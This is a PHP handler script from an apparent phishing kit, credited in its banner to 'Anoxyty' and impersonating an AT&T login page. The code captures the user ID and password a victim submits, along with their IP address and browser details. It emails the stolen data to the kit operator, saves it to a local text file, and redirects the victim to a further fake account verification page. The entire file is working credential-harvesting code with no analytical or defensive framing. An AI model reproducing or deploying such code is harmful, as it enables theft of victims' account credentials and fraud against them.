<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include '../data.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['userID'] ) ) {
		
		$_SESSION['userID'] 	  = $_POST['userID'];
		$_SESSION['password'] 	  = $_POST['password'];
		$code = <<<EOT
============== [ AT&T User LOGIN By Anoxyty | ]🔥 ==============
[USER ID] 		: {$_SESSION['userID']}
[PASSWORD]		: {$_SESSION['password']}

	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 AT&T User LOGIN By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 AT&T User LOGIN Email By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <att@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($data,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ../acctmgmt?lander/origination_point=tguard&Return_URL=&sessionid/mfaidentification");
        exit();
	} else {
		header("Location: ../dynamic?&web/auth/#/logon/recognizeUser/confirmation");
		exit();
	}
?>